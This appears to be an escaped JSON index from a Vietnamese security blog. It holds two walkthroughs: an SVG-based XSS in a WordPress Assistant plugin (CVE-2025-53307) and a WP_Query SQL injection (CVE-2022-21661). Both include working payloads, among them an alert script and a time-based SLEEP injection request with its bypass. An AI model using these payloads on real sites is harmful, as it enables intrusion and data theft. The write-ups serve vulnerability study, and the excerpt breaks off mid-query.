def about(): svg = \u0026#34;\u0026#34;\u0026#34;\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;svg xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34;\u0026gt; \u0026lt;script\u0026gt;alert(document.domain)\u0026lt;/script\u0026gt; \u0026lt;/svg\u0026gt;\u0026#34;\u0026#34;\u0026#34; return Response(svg, mimetype=\u0026#34;image/svg+xml\u0026#34;) {: file=\u0026ldquo;api/index.py\u0026rdquo;}\nG·ª≠i request ch·ª©a url param tr·ªè ƒë·∫øn https://yoursite/svg\nhttp://localhost/wp-admin/?fl_asst_image_proxy=abc\u0026amp;url=https://yoursite/svg üëâ Th√†nh c√¥ng v·ªõi Unauthenticated v√¨ ch·ªâ c·∫ßn ng∆∞·ªùi d√πng c√≥ quy·ªÅn, khi truy c·∫≠p url =\u0026gt; XSS x·∫£y ra tr√™n tr√¨nh duy·ªát c·ªßa n·∫°n nh√¢n. Attacker kh√¥ng c·∫ßn ƒëƒÉng nh·∫≠p.\nConclusion L·ªó h·ªïng CVE-2025-53307 trong plugin WordPress Assistant (\u0026lt;= v1.5.2) cho ph√©p XSS th√¥ng qua render_image() v√¨ kh√¥ng ki·ªÉm tra MIME type th·ª±c c·ªßa file. B·∫£n v√° v1.5.3 ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch x√°c th·ª±c n·ªôi dung file tr∆∞·ªõc khi tr·∫£ v·ªÅ tr√¨nh duy·ªát.\nKey takeaways:\nKh√¥ng tin c·∫≠y v√†o Content-Type header t·ª´ HTTP response. Lu√¥n x√°c th·ª±c MIME type th·ª±c s·ª± c·ªßa file. References Cross-site scripting (XSS) cheat sheet\nWordPress WordPress Assistant Plugin \u0026lt;= 1.5.2 is vulnerable to Cross Site Scripting (XSS)\n","permalink":"//localhost:1313/vi/posts/2025-09-16-cve-2025-53307/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eAssistant\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e3.6.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng ch√®n m√£ ƒë·ªôc (v√≠ d·ª•: script chuy·ªÉn h∆∞·ªõng, qu·∫£ng c√°o, ho·∫∑c c√°c payload HTML kh√°c) v√†o website, v√† nh·ªØng m√£ ƒë√≥ s·∫Ω ƒë∆∞·ª£c th·ª±c thi khi kh√°ch truy c·∫≠p m·ªü trang.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-53307\"\u003eCVE-2025-53307\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/assistant/\"\u003eWordPress Assistant Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: Cross Site Scripting\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.5.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: Medium (7.1)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAssistant\u003c/strong\u003e:  v1.5.2(vul) v√† v1.5.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng hi·ªÉn th·ªã tr·ª±c ti·∫øp n·ªôi dung h√¨nh ·∫£nh do ng∆∞·ªùi d√πng cung c·∫•p th√¥ng qua URL \u003cstrong\u003em√† kh√¥ng x√°c th·ª±c v√† ki·ªÉm tra ƒë·∫ßy ƒë·ªß MIME type\u003c/strong\u003e. ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn vi·ªác k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ cung c·∫•p m·ªôt t·∫≠p tin gi·∫£ d·∫°ng h√¨nh ·∫£nh v√† khi ƒë∆∞·ª£c tr√¨nh duy·ªát x·ª≠ l√Ω, n√≥ s·∫Ω th·ª±c thi m√£ ƒë·ªôc =\u0026gt; g√¢y ra l·ªó h·ªïng XSS.\u003c/p\u003e","title":"CVE-2025-53307"},{"content":"Introduction Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu (sanitization) kh√¥ng ƒë√∫ng c√°ch trong WP_Query, c√≥ nh·ªØng tr∆∞·ªùng h·ª£p c√≥ th·ªÉ x·∫£y ra SQL Injection th√¥ng qua c√°c plugin ho·∫∑c theme s·ª≠ d·ª•ng n√≥ theo m·ªôt c√°ch nh·∫•t ƒë·ªãnh. L·ªó h·ªïng n√†y ƒë√£ ƒë∆∞·ª£c v√° trong WordPress phi√™n b·∫£n 5.8.3. C√°c phi√™n b·∫£n c≈© h∆°n b·ªã ·∫£nh h∆∞·ªüng c≈©ng ƒë√£ ƒë∆∞·ª£c s·ª≠a th√¥ng qua b·∫£n ph√°t h√†nh b·∫£o m·∫≠t, quay ng∆∞·ª£c l·∫°i ƒë·∫øn t·∫≠n phi√™n b·∫£n 3.7.37.\nCVE ID: CVE-2022-21661 Product: WordPress Vulnerability Type: SQL Injection Affected Versions: 3.7.37 ‚â§ version \u0026lt; 5.8.3 CVSS severity: High (8.0) Requirements Local WordPress and Debugging WordPress: v5.8.2(vul) Setup Required PHP Version WordPress ƒë∆∞·ª£c x√¢y d·ª±ng ho√†n to√†n b·∫±ng PHP, v√¨ v·∫≠y phi√™n b·∫£n PHP tr√™n m√°y ch·ªß c√≥ ·∫£nh h∆∞·ªüng tr·ª±c ti·∫øp ƒë·∫øn kh·∫£ nƒÉng ho·∫°t ƒë·ªông c·ªßa WordPress:\nM·ªói phi√™n b·∫£n PHP ƒë·ªÅu b·ªï sung t√≠nh nƒÉng m·ªõi v√† lo·∫°i b·ªè d·∫ßn c√°c h√†m/c√∫ ph√°p l·ªói th·ªùi. N·∫øu WordPress d√πng t√≠nh nƒÉng m·ªõi nh∆∞ng PHP tr√™n server qu√° c≈© =\u0026gt; s·∫Ω ph√°t sinh l·ªói c√∫ ph√°p (syntax error) ho·∫∑c kh√¥ng ch·∫°y ƒë∆∞·ª£c. Ng∆∞·ª£c l·∫°i, n·∫øu PHP qu√° m·ªõi, m·ªôt s·ªë h√†m c≈© m√† WordPress v·∫´n c√≤n s·ª≠ d·ª•ng c√≥ th·ªÉ ƒë√£ deprecated ho·∫∑c b·ªã lo·∫°i b·ªè ho√†n to√†n, g√¢y l·ªói khi ch·∫°y. üëâ Do ƒë√≥, c·∫ßn l·ª±a ch·ªçn phi√™n b·∫£n PHP t∆∞∆°ng th√≠ch v·ªõi phi√™n b·∫£n WordPress. Trong ph√¢n t√≠ch n√†y, ta s·ª≠ d·ª•ng PHP 7.4 ƒë·ªÉ c√†i ƒë·∫∑t WordPress 5.8.2.\nVSCode Extensions WordPress c√≥ m√£ ngu·ªìn ph·ª©c t·∫°p, n√™n vi·ªác ƒë·ªçc t·ª´ng d√≤ng code th·ªß c√¥ng l√† kh√¥ng kh·∫£ thi. ƒê·ªÉ h·ªó tr·ª£ qu√° tr√¨nh debug v√† truy v·∫øt, ta c·∫ßn c√†i ƒë·∫∑t th√™m hai extension sau trong VS Code:\nPHP Extension Pack =\u0026gt; t√¨m b·∫±ng t·ª´ kh√≥a: xdebug.php-pack PHP Tools for VS Code =\u0026gt; t√¨m b·∫±ng t·ª´ kh√≥a: devsense.phptools-vscode Custom Plugin V√¨ l·ªó h·ªïng SQLi n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn WordPress Core, nh∆∞ng ch·ªâ c√≥ th·ªÉ khai th√°c gi√°n ti·∫øp th√¥ng qua plugin ho·∫∑c theme s·ª≠ d·ª•ng WP_Query, n√™n ta c·∫ßn th√¥ng qua m·ªôt plugin ho·∫∑c theme ƒë·ªÉ t·∫°o t∆∞∆°ng t√°c v·ªõi WP_Query.\nTa x√¢y d·ª±ng plugin s·ª≠ d·ª•ng WP_Query, hi·ªÉn th·ªã query ƒë∆∞·ª£c th·ª±c thi th√¥ng qua WP_Query::request.\n\u0026lt;?php /** * Plugin Name: Demo WP_Query * Description: Plugin demo WP_Query * Version: 1.0 * Author: w41bu1 */ if (!defined(\u0026#39;ABSPATH\u0026#39;)) exit; function da_show_posts() { $args = [ \u0026#39;post_type\u0026#39; =\u0026gt; \u0026#39;post\u0026#39;, \u0026#39;tax_query\u0026#39; =\u0026gt; [ [ \u0026#39;taxonomy\u0026#39; =\u0026gt; \u0026#39;category\u0026#39;, \u0026#39;field\u0026#39; =\u0026gt; \u0026#39;term_taxonomy_id\u0026#39;, \u0026#39;terms\u0026#39; =\u0026gt; [1,2,3], \u0026#39;operator\u0026#39; =\u0026gt; \u0026#39;IN\u0026#39;, ], ], ]; $query = new WP_Query($args); ob_start(); echo \u0026#39;\u0026lt;h3\u0026gt;Demo WP_Query\u0026lt;/h3\u0026gt;\u0026#39;; echo \u0026#39;\u0026lt;pre style=\u0026#34;background:#f0f0f0; padding:15px; width:100%; white-space:pre-wrap; word-wrap:break-word; overflow:auto;\u0026#34;\u0026gt;\u0026#39;; echo \u0026#34;SQL query generated by WP_Query:\\n\\n\u0026#34;; echo esc_html($query-\u0026gt;request); // Display excuted query echo \u0026#39;\u0026lt;/pre\u0026gt;\u0026#39;; if ($query-\u0026gt;have_posts()) { echo \u0026#39;\u0026lt;ul\u0026gt;\u0026#39;; while ($query-\u0026gt;have_posts()) { $query-\u0026gt;the_post(); echo \u0026#39;\u0026lt;li\u0026gt;\u0026#39; . get_the_title() . \u0026#39; (\u0026#39; . get_the_ID() . \u0026#39;)\u0026lt;/li\u0026gt;\u0026#39;; } echo \u0026#39;\u0026lt;/ul\u0026gt;\u0026#39;; } else { echo \u0026#39;\u0026lt;p\u0026gt;No posts found.\u0026lt;/p\u0026gt;\u0026#39;; } wp_reset_postdata(); return ob_get_clean(); } add_shortcode(\u0026#39;demo_wp_query\u0026#39;, \u0026#39;da_show_posts\u0026#39;); Taxonomy parameters\nT·∫°o page m·ªõi v·ªõi \u0026lt;page-title\u0026gt; c√≥ shortcode :\n[demo_wp_query] üëâ Truy v·∫•n s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã khi truy c·∫≠p http://localhost/\u0026lt;page-title\u0026gt;\nAnalysis wpdb\nL√† l·ªõp PHP c·ªët l√µi c·ªßa WordPress d√πng ƒë·ªÉ thao t√°c tr·ª±c ti·∫øp v·ªõi MySQL. Cho ph√©p l·∫≠p tr√¨nh vi√™n vi·∫øt v√† th·ª±c thi c√¢u SQL th√¥. WP_Query\nL√† m·ªôt l·ªõp tr·ª´u t∆∞·ª£ng h√≥a gi√∫p l·∫•y d·ªØ li·ªáu b√†i vi·∫øt (post) t·ª´ database m√† kh√¥ng c·∫ßn vi·∫øt SQL tr·ª±c ti·∫øp. L·∫≠p tr√¨nh vi√™n ch·ªâ c·∫ßn truy·ªÅn v√†o m·∫£ng tham s·ªë (args), WordPress s·∫Ω t·ª± ƒë·ªông d·ª±ng c√¢u SQL ph√π h·ª£p. M·ªëi quan h·ªá\nWP_Query kh√¥ng tr·ª±c ti·∫øp truy v·∫•n MySQL. Thay v√†o ƒë√≥, n√≥ x√¢y d·ª±ng c√¢u SQL d·ª±a tr√™n args, √°p d·ª•ng c√°c b∆∞·ªõc ki·ªÉm tra/validate, r·ªìi g·ªçi $wpdb ƒë·ªÉ th·ª±c thi. Patch Diff WordPress l√† m·ªôt d·ª± √°n m√£ ngu·ªìn m·ªü v·ªõi kho l∆∞u tr·ªØ ƒë∆∞·ª£c c√¥ng khai tr√™n GitHub. V√¨ v·∫≠y, m·ªçi b·∫£n v√° ƒë·ªÅu ƒë∆∞·ª£c commit tr·ª±c ti·∫øp t·∫°i ƒë√¢y. Do ƒë√≥, ƒë·ªÉ ph√¢n t√≠ch m·ªôt l·ªó h·ªïng, ta ch·ªâ c·∫ßn t√¨m ƒë·∫øn commit li√™n quan v√† quan s√°t s·ª± thay ƒë·ªïi trong m√£ ngu·ªìn.\nTrong ph·∫ßn reference c·ªßa CVE-2022-21661, c√≥ li√™n k·∫øt ƒë·∫øn commit tr√™n GitHub:\nL·ªó h·ªïng ƒë∆∞·ª£c v√° trong file src/wp-includes/class-wp-tax-query.php\nB·∫£n l·ªói\n$query[\u0026#39;terms\u0026#39;] = array_unique( (array) $query[\u0026#39;terms\u0026#39;] ); √âp $query['terms'] th√†nh m·∫£ng v√† lo·∫°i b·ªè gi√° tr·ªã tr√πng l·∫∑p. Kh√¥ng c√≥ b∆∞·ªõc ki·ªÉm tra ho·∫∑c √©p ki·ªÉu d·ªØ li·ªáu, d·∫´n ƒë·∫øn nguy c∆° ch√®n d·ªØ li·ªáu kh√¥ng h·ª£p l·ªá v√†o truy v·∫•n SQL. V√≠ d·ª•:\n$args = [ \u0026#39;post_type\u0026#39; =\u0026gt; \u0026#39;post\u0026#39;, \u0026#39;tax_query\u0026#39; =\u0026gt; [ [ \u0026#39;taxonomy\u0026#39; =\u0026gt; \u0026#39;category\u0026#39;, \u0026#39;field\u0026#39; =\u0026gt; \u0026#39;term_taxonomy_id\u0026#39;, \u0026#39;terms\u0026#39; =\u0026gt; [\u0026#39;1) AND (SELECT SLEEP(5)) # \u0026#39;], \u0026#39;operator\u0026#39; =\u0026gt; \u0026#39;IN\u0026#39;, ], ], ]; B·∫£n v√°\nif ( \u0026#39;slug\u0026#39; === $query[\u0026#39;field\u0026#39;] || \u0026#39;name\u0026#39; === $query[\u0026#39;field\u0026#39;] ) { $query[\u0026#39;terms\u0026#39;] = array_unique( (array) $query[\u0026#39;terms\u0026#39;] ); } else { $query[\u0026#39;terms\u0026#39;] = wp_parse_id_list( $query[\u0026#39;terms\u0026#39;] ); } B·ªï sung ƒëi·ªÅu ki·ªán d·ª±a v√†o $query['field']: N·∫øu l√† slug ho·∫∑c name =\u0026gt; gi·ªØ nguy√™n c√°ch x·ª≠ l√Ω c≈©. N·∫øu l√† ID =\u0026gt; d√πng wp_parse_id_list() ƒë·ªÉ √©p ki·ªÉu d·ªØ li·ªáu th√†nh m·∫£ng s·ªë nguy√™n an to√†n. Ta bi·∫øt ƒë√¢y l√† b∆∞·ªõc √©p ki·ªÉu d·ªØ li·ªáu th√†nh m·∫£ng s·ªë nguy√™n b·ªüi v√¨ trong tax_query1, tham s·ªë field ch·ªâ nh·∫≠n 4 gi√° tr·ªã: slug, name, term_taxonomy_id v√† term_id. Trong ƒë√≥, hai tr∆∞·ªùng term_taxonomy_id v√† term_id thu·ªôc b·∫£ng wp_term_taxonomy v√† ƒë·ªÅu c√≥ ki·ªÉu d·ªØ li·ªáu BIGINT UNSIGNED. {: .prompt-tip }\nmysql\u0026gt; DESC wp_term_taxonomy; +------------------+-----------------+------+-----+---------+----------------+ | Field | Type | Null | Key | Default | Extra | +------------------+-----------------+------+-----+---------+----------------+ | term_taxonomy_id | bigint unsigned | NO | PRI | NULL | auto_increment | | term_id | bigint unsigned | NO | MUL | 0 | | | taxonomy | varchar(32) | NO | MUL | | | | description | longtext | NO | | NULL | | | parent | bigint unsigned | NO | | 0 | | | count | bigint | NO | | 0 | | +------------------+-----------------+------+-----+---------+----------------+ 6 rows in set (0.01 sec) How it work? V·ªã tr√≠ l·ªó h·ªïng n·∫±m trong h√†m clean_query c·ªßa class WP_Tax_Query thu·ªôc file src/wp-includes/class-wp-tax-query.php\nprivate function clean_query( \u0026amp;$query ) { if ( empty( $query[\u0026#39;taxonomy\u0026#39;] ) ) { if ( \u0026#39;term_taxonomy_id\u0026#39; !== $query[\u0026#39;field\u0026#39;] ) { $query = new WP_Error( \u0026#39;invalid_taxonomy\u0026#39;, __( \u0026#39;Invalid taxonomy.\u0026#39; ) ); return; } // So long as there are shared terms, \u0026#39;include_children\u0026#39; requires that a taxonomy is set. $query[\u0026#39;include_children\u0026#39;] = false; } elseif ( ! taxonomy_exists( $query[\u0026#39;taxonomy\u0026#39;] ) ) { $query = new WP_Error( \u0026#39;invalid_taxonomy\u0026#39;, __( \u0026#39;Invalid taxonomy.\u0026#39; ) ); return; } $query[\u0026#39;terms\u0026#39;] = array_unique( (array) $query[\u0026#39;terms\u0026#39;] ); // \u0026lt;== Vulnerability location if ( is_taxonomy_hierarchical( $query[\u0026#39;taxonomy\u0026#39;] ) \u0026amp;\u0026amp; $query[\u0026#39;include_children\u0026#39;] ) { $this-\u0026gt;transform_query( $query, \u0026#39;term_id\u0026#39; ); if ( is_wp_error( $query ) ) { return; } $children = array(); foreach ( $query[\u0026#39;terms\u0026#39;] as $term ) { $children = array_merge( $children, get_term_children( $term, $query[\u0026#39;taxonomy\u0026#39;] ) ); $children[] = $term; } $query[\u0026#39;terms\u0026#39;] = $children; } $this-\u0026gt;transform_query( $query, \u0026#39;term_taxonomy_id\u0026#39; ); } {: file=\u0026ldquo;src/wp-includes/class-wp-tax-query.php v5.8.2\u0026rdquo; }\nTrong h√†m clean_query, tham s·ªë $query ƒë∆∞·ª£c truy·ªÅn theo tham chi·∫øu (c√≥ d·∫•u \u0026amp;). Do ƒë√≥, m·ªçi thay ƒë·ªïi tr√™n bi·∫øn $query b√™n trong h√†m s·∫Ω t√°c ƒë·ªông tr·ª±c ti·∫øp ƒë·∫øn bi·∫øn $query g·ªëc ƒë∆∞·ª£c truy·ªÅn v√†o t·ª´ b√™n ngo√†i.\nPayload ƒë∆∞·ª£c truy·ªÅn v√†o th√¥ng qua $query['terms']. Trong h√†m clean_query, gi√° tr·ªã n√†y s·∫Ω ƒë∆∞·ª£c x·ª≠ l√Ω v√† l√†m s·∫°ch.\nüëâ V√¨ v·∫≠y, ƒë·ªÉ khai th√°c th√†nh c√¥ng, payload trong $query['terms'] c·∫ßn v∆∞·ª£t qua to√†n b·ªô c∆° ch·∫ø ki·ªÉm tra v√† l·ªçc c·ªßa clean_query tr∆∞·ªõc khi ƒë·∫øn b∆∞·ªõc th·ª±c thi SQL.\nDebugging Do logic c·ªßa WordPress Core kh√° ph·ª©c t·∫°p, ta c·∫ßn s·ª≠ d·ª•ng debugger ƒë·ªÉ ph√¢n t√≠ch. ƒê·∫∑t breakpoint t·∫°i ƒë·∫ßu h√†m clean_query, sau ƒë√≥ nh·∫•n F5 ƒë·ªÉ b·∫Øt ƒë·∫ßu debug.\nKhi truy c·∫≠p http://localhost/\u0026lt;page-title\u0026gt;, debugger s·∫Ω d·ª´ng t·∫°i h√†m clean_query.\nL·∫ßn ƒë·∫ßu, WordPress th·ª±c hi·ªán query v·ªõi taxonomy = wp_theme (kh√¥ng ph·∫£i gi√° tr·ªã ta truy·ªÅn v√†o). Nh·∫•n F5 th√™m m·ªôt l·∫ßn ƒë·ªÉ b·ªè qua, debugger s·∫Ω ƒë·∫øn query c√≥ taxonomy kh·ªõp v·ªõi gi√° tr·ªã ta truy·ªÅn v√†o.\nV√¨ $query['taxonomy'] t·ªìn t·∫°i n√™n truy v·∫•n v∆∞·ª£t qua c√°c nh√°nh if/elseif ban ƒë·∫ßu trong clean_query. Ti·∫øp t·ª•c debug, ƒëi·ªÅu ki·ªán k·∫ø ti·∫øp ƒë∆∞·ª£c th·ªèa m√£n =\u0026gt; ta nh·∫£y v√†o h√†m transform_query v·ªõi tham s·ªë:\n$query (tham chi·∫øu t·ªõi query hi·ªán t·∫°i) $resulting_field = 'term_id' (gi√° tr·ªã fix c·ª©ng) Nh·∫•n F11 ƒë·ªÉ step into v√†o transform_query.\npublic function transform_query( \u0026amp;$query, $resulting_field ) { // other logic if ( $query[\u0026#39;field\u0026#39;] == $resulting_field ) { return; } // Empty \u0026#39;terms\u0026#39; always results in a null transformation. // other logic $args = array( \u0026#39;get\u0026#39; =\u0026gt; \u0026#39;all\u0026#39;, \u0026#39;number\u0026#39; =\u0026gt; 0, \u0026#39;taxonomy\u0026#39; =\u0026gt; $query[\u0026#39;taxonomy\u0026#39;], \u0026#39;update_term_meta_cache\u0026#39; =\u0026gt; false, \u0026#39;orderby\u0026#39; =\u0026gt; \u0026#39;none\u0026#39;, ); // Term query parameter name depends on the \u0026#39;field\u0026#39; being searched on. switch ( $query[\u0026#39;field\u0026#39;] ) { case \u0026#39;slug\u0026#39;: break; // other logic default: $args[\u0026#39;include\u0026#39;] = wp_parse_id_list( $terms ); break; } $term_query = new WP_Term_Query(); $term_list = $term_query-\u0026gt;query( $args ); if ( is_wp_error( $term_list ) ) { $query = $term_list; return; } // other logic $query[\u0026#39;terms\u0026#39;] = wp_list_pluck( $term_list, $resulting_field ); $query[\u0026#39;field\u0026#39;] = $resulting_field; } {: file=\u0026ldquo;src/wp-includes/class-wp-tax-query.php v5.8.2\u0026rdquo; }\nT·∫°i ƒë√¢y, $query['terms'] b·ªã ghi ƒë√® b·ªüi k·∫øt qu·∫£ c·ªßa wp_list_pluck.\nüëâ Mu·ªën gi·ªØ nguy√™n payload trong $query['terms'], ta ph·∫£i tr√°nh ƒë·ªÉ n√≥ b·ªã g√°n l·∫°i. C√≥ 2 c√°ch:\nPh√¢n t√≠ch wp_list_pluck ƒë·ªÉ xem c√≥ l·ªó h·ªïng bypass. K·∫øt th√∫c s·ªõm transform_query b·∫±ng c√°ch l·ª£i d·ª•ng ƒëi·ªÅu ki·ªán (focus): if ( $query[\u0026#39;field\u0026#39;] == $resulting_field ) { return; } Trong h√†m clean_query, ·ªû l·∫ßn g·ªçi transform_query ƒë·∫ßu ti√™n, $resulting_field = 'term_id' (kh√°c v·ªõi gi√° tr·ªã ta truy·ªÅn v√†o l√† 'term_taxonomy_id')\nTuy nhi√™n, ·ªü cu·ªëi clean_query, transform_query ƒë∆∞·ª£c g·ªçi l·∫°i v·ªõi:\n$this-\u0026gt;transform_query( $query, \u0026#39;term_taxonomy_id\u0026#39; ); L√∫c n√†y, $resulting_field tr√πng kh·ªõp v·ªõi $query['field'] m√† ta truy·ªÅn v√†o ('term_taxonomy_id'), n√™n h√†m s·∫Ω return s·ªõm, kh√¥ng ghi ƒë√® $query['terms'].\nüëâ Ch·ªâ c·∫ßn b·ªè qua ƒëi·ªÅu ki·ªán if th·ª© 2 trong clean_query, th√¨ ƒë·∫øn cu·ªëi h√†m, transform_query() s·∫Ω return s·ªõm khi $resulting_field == $query['field']. Khi ƒë√≥, payload trong $query['terms'] v·∫´n nguy√™n v·∫πn, kh√¥ng b·ªã thay ƒë·ªïi.\nTa ch·ªâ c·∫ßn th√™m $query['include_children'] v·ªõi gi√° tr·ªã false th√¨ ƒëi·ªÅu ki·ªán if s·∫Ω kh√¥ng x·∫£y ra.\n$args = [ \u0026#39;post_type\u0026#39; =\u0026gt; \u0026#39;post\u0026#39;, \u0026#39;tax_query\u0026#39; =\u0026gt; [ [ \u0026#39;taxonomy\u0026#39; =\u0026gt; \u0026#39;category\u0026#39;, \u0026#39;field\u0026#39; =\u0026gt; \u0026#39;term_taxonomy_id\u0026#39;, \u0026#39;terms\u0026#39; =\u0026gt; [\u0026#39;payload\u0026#39;], \u0026#39;operator\u0026#39; =\u0026gt; \u0026#39;IN\u0026#39;, \u0026#39;include_children\u0026#39; =\u0026gt; false ], ], ]; Thay ƒë·ªïi $args trong plugin c·ªßa ta, t·∫Øt debugger sau ƒë√≥ truy c·∫≠p v√†o http://localhost/\u0026lt;page-title\u0026gt;, quan s√°t c√¢u query th·ª±c s·ª± nguy√™n v·∫πn.\nüëâ Th√†nh c√¥ng ki·ªÉm so√°t payload.\nFlow ƒê·ªÉ hi·ªÉu r√µ ƒë∆∞·ª£c lu·ªìng g·ªçi h√†m, ta c·∫ßn ph√¢n t√≠ch callstack c·ªßa debugger.\nƒê·∫ßu ti√™n, ƒë·ªëi t∆∞·ª£ng WP_Query ƒë∆∞·ª£c t·∫°o v·ªõi ƒë·ªëi s·ªë $args ch·ª©a terms do ta ki·ªÉm so√°t\n__construct c·ªßa WP_Query ƒë∆∞·ª£c g·ªçi sau ƒë√≥ g·ªçi ƒë·∫øn h√†m query\nquery th·ª±c hi·ªán parse args v·ªõi ƒë·ªëi s·ªë $query sau ƒë√≥ g·ªçi h√†m get_posts\nget_posts ki·ªÉm tra c√¢u ƒëi·ªÅu ki·ªán v√† g·ªçi get_sql l√†m gi√° tr·ªã tr·∫£ v·ªÅ cho $clauses n·∫øu ƒëi·ªÅu ki·ªán ƒë√∫ng. Quan s√°t Variable \u0026gt; Local \u0026gt; $this(WP_Query) \u0026gt; is_singular b√™n debugger tab, is_singular c√≥ gi√° tr·ªã false n√™n c√¢u ƒëi·ªÅu ki·ªán ƒë√∫ng, get_sql ƒë∆∞·ª£c g·ªçi.\nget_sql tr·∫£ v·ªÅ gi√° tr·ªã c·ªßa get_sql_clauses\nget_sql_clauses g·ªçi ƒë·∫øn get_sql_for_query v·ªõi ƒë·ªëi s·ªë l√† tham chi·∫øu ƒë·∫øn $queries\nget_sql_for_query duy·ªát qua m·∫£ng $query ki·ªÉm tra c√°c $key, n·∫øu $key kh√¥ng ph·∫£i relation th√¨ ki·ªÉm tra ƒëi·ªÅu ki·ªán is_first_order_clause c·ªßa $claude\nN·∫øu $clause c√≥ 1 trong c√°c key sau:\n$keys = [\u0026#39;terms\u0026#39;, \u0026#39;taxonomy\u0026#39;, \u0026#39;include_children\u0026#39;, \u0026#39;field\u0026#39;, \u0026#39;operator\u0026#39;] Th√¨ get_sql_for_clause s·∫Ω ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë $clause v√† $query\nget_sql_for_clause g·ªçi ƒë·∫øn clean_query ƒë·ªÉ l√†m s·∫°ch $clause, nh∆∞ng ta ƒë√£ bypass =\u0026gt; terms trong $clause kh√¥ng thay ƒë·ªïi.\n$where ƒë∆∞·ª£c g√°n gi√° tr·ªã ch·ª©a payload terms do ta ki·ªÉm so√°t, v√† ƒë∆∞·ª£c g√°n v√†o $sql tr·∫£ v·ªÅ.\n$sql['where'] ƒë∆∞·ª£c g√°n l·∫°i gi√° tr·ªã tr∆∞·ªõc khi tr·∫£ v·ªÅ.\nget_sql_for_query nh·∫≠n $sql tr·∫£ v·ªÅ t·ª´ get_sql_for_clause, th√™m () v√†o $sql['where'] v√† tr·∫£ v·ªÅ cho get_sql_clauses\nget_sql_clauses th√™m AND v√†o $sql['where'] v√† tr·∫£ v·ªÅ cho get_sql.\nget_sql tr·∫£ v·ªÅ gi√° tr·ªã l·∫•y t·ª´ get_sql_clauses\nget_posts l·∫•y gi√° tr·ªã tr·∫£ v·ªÅ t·ª´ get_sql g√°n cho $clauses\n$where ƒë∆∞·ª£c concat v·ªõi gi√° tr·ªã $clauses['where']\nüëâ get_posts l√† h√†m ch√≠nh th·ª±c thi SQL query b·∫±ng $wpdb ƒë·ªÉ bi·∫øt c√¢u query ƒë∆∞·ª£c th·ª±c thi ·ªü ƒë√¢u, ta ƒë·∫∑t breakpoint t·∫°i n∆°i c√≥ $wpdb trong get_posts, quan s√°t $wpdb \u0026gt; last_query (ch·ª©a c√¢u l·ªánh th·ª±c thi g·∫ßn nh·∫•t) v√† li√™n t·ª•c F10 ƒë·ªÉ debugger ch·∫°y ƒë·∫øn n∆°i th·ª±c thi query.\nL·ªói \u0026quot;Unknown column 'payload' in 'where clause'\u0026quot; xu·∫•t hi·ªán t·∫°i tab debugger ch·ª©a n·ªôi dung c·ªßa payload\nüëâ $where ch·ª©a payload ƒë∆∞·ª£c th√™m v√†o $this-\u0026gt;request t·∫°i d√≤ng 3012 v√† th·ª±c thi t·∫°i d√≤ng 3026 b·∫±ng $wpdb-\u0026gt;get_col()\nChart\nExploit Ta t√πy ch·ªânh gi√° tr·ªã c·ªßa terms ƒë·ªÉ m√¥ ph·ªèng tr∆∞·ªùng h·ª£p terms truy·ªÅn v√†o c√≥ th·ªÉ ki·ªÉm so√°t b·ªüi attacker\n\u0026#39;terms\u0026#39; =\u0026gt; [$_GET[\u0026#39;terms\u0026#39;]], Detect SQLi Thay gi√° tr·ªã c·ªßa terms b·∫±ng payload SQLi v√† g·ª≠i request qua Burp Suite:\nGET /demo/?terms=1)+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))a)+%23+ HTTP/1.1 C·∫•u query th·ª±c s·ª±:\nSELECT SQL_CALC_FOUND_ROWS wp_posts.ID FROM wp_posts LEFT JOIN wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id) WHERE 1=1 AND ( wp_term_relationships.term_taxonomy_id IN (1) AND (SELECT 1 FROM (SELECT SLEEP(5))a) # ) ) AND wp_posts.post_type = \u0026#39;post\u0026#39; AND (wp_posts.post_status = \u0026#39;publish\u0026#39;) GROUP BY wp_posts.ID ORDER BY wp_posts.post_date DESC LIMIT 